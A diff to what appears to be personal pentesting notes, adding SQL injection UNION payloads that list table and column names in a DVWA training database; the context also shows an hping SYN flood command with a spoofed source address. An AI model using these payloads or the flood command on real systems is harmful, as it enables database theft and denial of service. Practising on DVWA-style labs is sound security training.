@@ -102,6 +102,13 @@ hping -S <target-ip> -a <spoofed-host-ip> -p 23 --flood
 
 ### CheatSheet
 - <a href="https://www.researchgate.net/figure/Retrieve-all-tables-in-the-dvwa-database-12-There-are-two-tables-in-the-database-based_fig8_354874121"> CheatSheet </a>
+- SQL
+Column names
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'#
+
+table names
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa'#
+
 
 ### Example Payloads:
 ```sql
